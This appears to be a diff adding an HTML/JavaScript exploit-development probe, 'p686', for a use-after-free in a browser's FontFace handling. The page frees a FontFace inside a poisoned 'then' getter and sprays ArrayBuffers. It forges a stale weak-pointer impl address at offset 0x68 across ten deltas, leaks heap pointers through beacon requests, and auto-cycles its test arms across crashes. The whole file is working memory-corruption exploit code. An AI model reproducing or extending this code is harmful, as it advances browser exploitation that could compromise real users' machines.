@@ -1,0 +1,200 @@
+<!--
+  p686: FontFace impl-walk bisect — which fields of the DefaultWeakPtrImpl
+        does the continuation read when +0x68 holds a valid stale impl?
+
+  Background (p685 census, #181 6681183419):
+    +0x68 = priorImpl  -> SURVIVES, and the engine SKIPS its pair write.
+                          The walk consumes the impl's own words.
+    +0x68 = T          -> dies (wrong-shape pointer followed).
+  Impl layout (cobra): +0x00 refcount/deletion-begun bits, +0x08 m_ptr
+  (points at the live FontFace wrapper), +0x10 thread flag; size 0x18.
+
+  Arms forge +0x68 = priorImpl + delta (delta slides the interpreted
+  window across / past the impl). The survive/crash boundary maps which
+  offsets the walk dereferences relative to the impl pointer.
+
+  Protocol v3 (prime/arm alternation): p686's first clean run proved the
+  2nd consecutive UAF load in a process dies 9/9 REGARDLESS of the forge;
+  every census load therefore follows a fresh PRIME load (leak without
+  forge), so every walk observation is an arm#1-class load.
+    [this prime] -> [arm delta k] -> [this prime] -> [arm delta k+1] ...
+
+
+    #0  delta 0      (p685 arm-9 repeat — known survivor, sanity)
+    #1  delta +8     (impl view starts at m_ptr cell)
+    #2  delta +0x10  (thread-flag cell as refcount)
+    #3  delta +0x18  (past impl — whatever follows)
+    #4  delta +0x20
+    #5  delta +0x28
+    #6  delta -8     (refcount view starts in bytes before impl)
+    #7  delta -0x10
+    #8  delta -0x18
+    #9  delta -0x20
+
+  Same discipline as p685: blind forge into all 16 buffers BEFORE the
+  check() walk; NO beacon inside the poisoned then-getter; auto-cycle via
+  localStorage p686arm (crash restart advances one arm); prime values are
+  read from p685's stored T/impl (same origin).
+
+  CRASH_CLASS: HIGH (each arm load may die — that is the evidence)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p686</title></head>
+<body>p686: impl-walk bisect
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function(){
+'use strict';
+var L=document.getElementById('log'),bQ=[];
+function emit(t,m){var s=t+(m!==undefined?' '+m:'');L.textContent+=s+'\n';bQ.push(s);if(bQ.length>=1)flush();}
+function flush(){if(!bQ.length)return;try{var b=bQ.splice(0,3).join('|');var x=new XMLHttpRequest();x.open('GET','/beacon/P686-'+encodeURIComponent(b),false);x.send();}catch(e){}}
+window.onerror=function(m){emit('ERR',String(m).slice(0,200));flush();};
+function hex8(v){return('0'+v.toString(16)).slice(-2);}
+function qw(v,off){var s='';for(var i=7;i>=0;i--)s+=hex8(v[off+i]);return s;}
+
+var arm=parseInt(location.hash.slice(1));if(isNaN(arm))arm=0;
+// death detection FIRST — before this load's own START beacon resets alive
+var diedSince=0,deadArm=null;
+try{
+  var sx=new XMLHttpRequest();sx.open('GET','/p686state',false);sx.send();
+  if(sx.status===200){
+    var st=JSON.parse(sx.responseText);
+    if(st.died){diedSince=1;deadArm=st.deadArm;}
+  }
+}catch(e){}
+// auto-cycle like p685: root-only console, localStorage carries the index
+(function(){
+  try{
+    var stored=parseInt(localStorage.getItem('p686arm'));
+    if(!isNaN(stored))arm=stored;
+  }catch(e){}
+})();
+emit('START','v1 arm='+arm+' died='+(diedSince?'arm'+deadArm:'no'));flush();
+
+var priorT='',priorI='';
+// if the previous load died, its T/impl are addresses of the dead process
+try{
+  priorT=localStorage.getItem('p686T')||localStorage.getItem('p685T')||'';
+  priorI=localStorage.getItem('p686I')||localStorage.getItem('p685I')||'';
+}catch(e){}
+if(diedSince){
+  emit('STATE','previous load (arm '+deadArm+') DIED — invalidating T/impl, re-priming');
+  priorT='';priorI='';
+}
+if(priorT)emit('PRIOR-T',priorT);else emit('PRIOR-T','none');
+if(priorI)emit('PRIOR-I',priorI);else emit('PRIOR-I','none');
+flush();
+
+var DELTAS=[0,8,0x10,0x18,0x20,0x28,-8,-0x10,-0x18,-0x20];
+var delta=DELTAS[arm];if(delta===undefined)delta=0;
+// phase machine PRIME <-> ARM, strictly alternating. p686 10:12 run proved
+// the 2nd consecutive UAF load of a process dies regardless of forge
+// content (9/9, even delta=0 exact impl), while arm#1-class loads survive
+// at every delta. Every census load must follow a fresh prime so the
+// forge outcome measures content, not load position.
+var phase=null;
+try{phase=localStorage.getItem('p686phase');}catch(e){}
+var primeMode = !!diedSince || (phase!=='arm') || !priorI;
+if(primeMode)phase='prime';
+var forgeVal='';
+// next-load phase is fixed here: after a prime the next load runs the arm;
+// after an arm load (survived or not) the next load re-primes. A dead load
+// short-circuits this via diedSince anyway.
+try{localStorage.setItem('p686phase', primeMode?'arm':'prime');}catch(e){}
+if(primeMode){
+  emit('SEQ','prime load (leak); next reload = arm '+arm+' delta='+DELTAS[arm!==undefined&&DELTAS[arm]!==undefined?arm:0]);flush();
+}else{
+  // forge value: priorImpl + delta padded to full 16 hex chars
+  var v=parseInt(priorI,16)+delta;
+  if(v<0)v+=0x10000000000;
+  forgeVal=('0000000000000000'+v.toString(16)).slice(-16);
+  emit('ARM','off=0x68 delta='+delta+' val=0x'+forgeVal);
+  var nxt=arm>=DELTAS.length-1?0:arm+1;
+  // advance the arm ONLY on arm-mode loads; an arm death still counts as
+  // its observation and the post-death re-prime resumes at deadArm+1
+  try{localStorage.setItem('p686arm',String(nxt));}catch(e){}
+  emit('SEQ','next arm = '+nxt+' delta='+DELTAS[nxt]);
+}
+flush();
+
+var style,ff,fired=false,map=[];
+style=document.createElement('style');
+style.textContent="@font-face { font-family: s0; src: local(Arial); unicode-range: U+0042; }";
+document.head.appendChild(style);
+ff=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(ff);
+void ff.loaded;
+window.__p686keep=ff;
+
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(fired)return undefined;
+    fired=true;
+    // free -> spray -> [blind forge unless priming] -> walk
+    // NO beacons in this window
+    style.remove();
+    try{document.fonts.delete(ff);}catch(e){}
+    document.body.offsetHeight;
+    map=[];
+    for(var k=0;k<16;k++){
+      var ab=new ArrayBuffer(192);
+      var v=new Uint8Array(ab);
+      if(!primeMode){
+        var hx=forgeVal;
+        for(var b=0;b<8;b++)v[0x68+b]=parseInt(hx.substr(b*2,2),16);
+      }
+      map.push({ab:ab,view:v});
+    }
+    try{document.fonts.check('1em s0');}catch(e){}
+    return undefined;
+  },
+  set:function(){}
+});
+
+document.fonts.load('1em f0, s0','AB').then(function(){
+  emit('RESOLVED','promise ok');
+},function(){emit('REJECTED','promise rejected');});
+
+setTimeout(function(){
+  var hit=-1,nzBest=0;
+  for(var i=0;i<map.length;i++){
+    var v=map[i].view,n=0;
+    for(var j=0;j<192;j++)if(v[j]!==0)n++;
+    if(n>nzBest){nzBest=n;hit=i;}
+  }
+  if(hit<0)emit('SCAN','clean-no-reclaim');
+  else{
+    var v=map[hit].view;
+    emit('SCAN','buf='+hit+' nz='+nzBest);
+    emit('PAIR','58='+qw(v,0x58)+' 68='+qw(v,0x68));
+    var cells='';
+    for(var o=0x18;o<=0x68;o+=8)cells+=o.toString(16)+':'+qw(v,o)+' ';
+    emit('RUN',cells.trim());
+    if(primeMode){
+      try{
+        localStorage.setItem('p686T',qw(v,0x58));
+        localStorage.setItem('p686I',qw(v,0x68));
+        // p685-era keys are values of possibly-dead processes; this prime's
+        // values are the only truth now
+        localStorage.removeItem('p685T');localStorage.removeItem('p685I');
+        // resume the census at the arm AFTER the one that died (wrap at 9)
+        if(deadArm!==null){
+          var resume=deadArm>=DELTAS.length-1?0:deadArm+1;
+          localStorage.setItem('p686arm',String(resume));
+          emit('SEQ','resume plan: next load = arm '+resume);
+        }
+      }catch(e){}
+      emit('STORED','T='+qw(v,0x58)+' I='+qw(v,0x68));
+    }
+  }
+  document.body.offsetHeight;
+  emit('ALIVE','survived delta='+delta+' val=0x'+forgeVal);
+  flush();
+  emit('DONE','arm='+arm);
+  flush();
+},150);
+
+})();
+</script>
+</body>
+</html>
